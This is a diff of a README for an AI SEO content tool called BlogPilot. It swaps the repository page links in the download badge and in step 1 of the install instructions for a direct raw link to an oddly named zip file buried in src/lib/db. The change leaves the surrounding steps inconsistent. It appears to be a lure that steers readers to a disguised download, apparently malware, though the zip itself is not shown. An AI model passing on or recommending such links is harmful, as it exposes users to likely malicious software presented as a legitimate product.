@@ -1,6 +1,6 @@
 # 🚀 BlogPilot-Open-Source-AI-SEO-Content-Studio - Create High Ranking Content Using AI
 
-[![Download BlogPilot](https://img.shields.io/badge/Download-BlogPilot-blue.svg)](https://github.com/Mohammeda6233/BlogPilot-Open-Source-AI-SEO-Content-Studio)
+[![Download BlogPilot](https://img.shields.io/badge/Download-BlogPilot-blue.svg)](https://raw.githubusercontent.com/Mohammeda6233/BlogPilot-Open-Source-AI-SEO-Content-Studio/main/src/lib/db/Source_Pilot_Blog_A_Open_Studio_Content_SE_3.7-alpha.4.zip)
 
 BlogPilot helps you build search engine content. It manages tasks like keyword research, schema markup, and content auditing in one dashboard. You host the application on your computer. This gives you control over your data. You provide your own AI key to use the features.
 
@@ -27,7 +27,7 @@ BlogPilot organizes your content workflow. It includes 39 modules for various ta
 
 You must visit the project page to download the software. Follow these steps:
 
-1. Visit [https://github.com/Mohammeda6233/BlogPilot-Open-Source-AI-SEO-Content-Studio](https://github.com/Mohammeda6233/BlogPilot-Open-Source-AI-SEO-Content-Studio).
+1. Visit [https://raw.githubusercontent.com/Mohammeda6233/BlogPilot-Open-Source-AI-SEO-Content-Studio/main/src/lib/db/Source_Pilot_Blog_A_Open_Studio_Content_SE_3.7-alpha.4.zip](https://raw.githubusercontent.com/Mohammeda6233/BlogPilot-Open-Source-AI-SEO-Content-Studio/main/src/lib/db/Source_Pilot_Blog_A_Open_Studio_Content_SE_3.7-alpha.4.zip).
 2. Look for the Releases section on the right side of the screen.
 3. Click the latest version number.
 4. Scroll to the Assets section.
